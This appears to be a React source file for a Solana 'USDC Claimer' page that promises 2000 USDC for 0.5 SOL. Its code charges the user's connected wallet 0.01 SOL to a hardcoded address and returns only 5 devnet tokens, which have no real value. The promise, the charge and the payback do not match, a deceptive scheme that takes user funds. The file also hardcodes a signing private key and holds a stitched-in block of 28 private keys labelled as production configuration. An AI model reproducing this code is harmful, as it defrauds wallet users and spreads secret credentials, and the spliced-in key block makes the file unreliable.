/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "ccmwX4nubdTha7Mif6J2kYzqFiE7KaySUyoZTEsuq99mZ5j41hWqy74DWc7GhzG1Q5bRWsmGEvH1A4tDk4eFtmm"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4BJ1rxcmHwywE7hDzVXJnJKdEFv2dhkQBdUi2kdgTqNpUevVaYHcHfShteLWrVYim7ksWcH7ocahAn5DaA3QjCLW",
  "key1": "2FgccRspTTyCMDxMMPokLcMsXPdR155SiJiHfYMq1WtFNAUHPR8vbWj2m4TKZmiaznkJrKjJAm7XhhZPrunTgpdi",
  "key2": "4dKHFtMx8MNu9dsk4L9z1Vps5UMQKWqididJZN1VrjFgeGpQUUzXdUCHsxy2yrh6U8cb543pCq46ZF21RtrgFTLu",
  "key3": "5Nj7XXfd99XxkF1KVrzDbBZKjDM9tQyjixcSjj1yfbGEjWGzzoHkHR6AV5ACLfx71LJxmqQzKEKSscpRqr8fuf6q",
  "key4": "2AFFnoU1twfYqXeezrkKbvg3s5Hkm99x2iAjpPHrrir16cfoq1Vuu54qpJD727waEyeqSocJV7Lp6jh2oSuSS5Ui",
  "key5": "5kioCQr52kk4aMuFkaHsGq787rC4SKhmA9v8bji1efx2khXp2dgjnExZ4oxvxbAzAdCZnBKumzK6yexhCu2VagZK",
  "key6": "5xEfxH8UvYRW7UEeVTtz54Yxfxy2n4VEEb1gmXGFcVfy96V4XxDbDeiSeJhe7rM22hWfeMFoRB2MN29W3xrVtf8E",
  "key7": "2Rz5RzDX8WG4p5cdBypu8YCAskWRTGnmhj7e475yH88An1PswwN3eZAUAV2VM13WCYx1u8vnM2jQWeRp5pmrwnjq",
  "key8": "52dDTbPgYRBnpWaG5Jtnj2TtcnXDtkhTNqA83TBJ7T7SRograYgQF9bjTMgmQHMF8AW96GkNZqL3bGreXVhf1c3y",
  "key9": "jkpNpHEuei1VQq7wBp2FFDxLzPfbEX4xNGkfTHMAtmEwZLtEQUKcwD9N7RhYKVBk6KUEdWXPKSJP94eXtY9B4j1",
  "key10": "3nvWwGs4fvbYGLEGXtEKQwiSb7PbKCfxvamDGFWYjeke6SobweEsVePh34tdkhJT6tjAfgHZX5pA6ysUu8CSPKyu",
  "key11": "2b2PhiCnAdYJ8Go9wKQkNkbf4mLiBtk3fBw3UzKN2Yqh6FRLJEhQQEx82BZv5eK7MPBXN7cGeZhiV6REeoPrGSSC",
  "key12": "4tDrNgTJQJjijr6MCDEHg1tKfLx2qbbVuJiHyXH2MU6ZZ1cQSZtiyFb9DyUL8Rr6qCcWaokbcR3BL1h2r7VC5Jqp",
  "key13": "3fyRTjCSN8sHRzrBEToGvKkoDh3TJ5uL6jM7G9BzABZzmquoFSW8gs4Bn4WNp1haLGv5x8XHSdK16KXdXy5LiJs4",
  "key14": "YvPSvUFNLFcQ4KjzKXAjPdrNLWxxfbozDwstdwnMZ9NAR2aXV8Kjypykw1dRtCJvjW1riD8Fw15SzviG4tqv2jX",
  "key15": "4UcEuoxcevCPC8JVj9X912TH5H3LLF3W3X8ypj4NEiJdeXs6tuwUWZMz45QJTeYa9UBCFT1XddbTy2qUgstpynmo",
  "key16": "nPkkT7pVEtgJbG5dmYvD8qsacUs2BRikZywz6Saqo2aNGVfzu4o4fomyySEtR2pvDXvDDK5fPfRQoo3oEc75cQv",
  "key17": "3NFrYdEzAdU3X8YqY9cM5VzCbci7JiBQoJBCqv5aBWvbivb69J3763wMDNLGZkCAUgFE7okWwJ95oWxmsqb53L5n",
  "key18": "47Re7yFMyxnUwiR4vNHTUgCFnxjaurSVihrXMAxHGmfdykJUMJvPhVkeyMoszwmK4YQ8VyGFS789EvCHMZANDmaF",
  "key19": "2rqyttQPqbMa96UASV36TvDtcGAEGTk3Wmd2tHWiKdLVZj79ojh3NPN3J3LnFB2hYAtzm6odiAeuSKoRExman6qH",
  "key20": "2ToeEKqNMFtxCoHknfMeyoesgQtZd4coJMnWSdVqscRsy7uiHjhmg1SzXGy7omwYmx3SqCPrur8HoCrNAZ6o3xp1",
  "key21": "3cRoYLeZEcudSF6ei5umCVSLsRXCfvp7raCDH9rKcZmDbUAaRrRw9xpnY1B5oZM28X8tQM3Um6ptoDuDtRG1LVxW",
  "key22": "ykmpeVEuyAcJmtcnj9E9ejCaxpdf9ZZnos5vnDQxuoEhLsBC8DJ9S8tGbXsv1Vz719Ut8zrPUVuWjQpMJQZsLxV",
  "key23": "5ci4tXRp6iDpUG1jZs4E9A5QUTSy1t66mBR8hVAehiWARBzS2hTMWLdxSjjKP3rVHLXyzWYTnaSSHB6NLaQVEtJk",
  "key24": "2BNmDisVLpdfYLMGdqLpaEfjFSyRkyuzk429CZSwrcaJouBiLoyr1oQpjaG53kAjbZ6ASqEMgCDQM9AwHmfJQD6A",
  "key25": "3VciHRhuLLvMPKYRhpxanybKtFkB5XBrTZibjm9VF9A1F13sGvGQMBvBfYp8K6Aec5pbR7AjRDvzC6znGaQMGqPT",
  "key26": "4ABaSH9Rp4dGyMo4oyVhZadpLZRHdMhPuNZezB1gPfBFBMc1k3Xtg9zHkBsruFnjBsXZ1Ecj7bTLF2TGGATXQ1JN",
  "key27": "3QkSKb3ve9shmwPDseJcm9MapVCQjsrKp4z4DHzJLjJxfUPvTtG8tCxHngPEnQvUaKfsKXJKdsWEJnv5BDuDyZsS"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
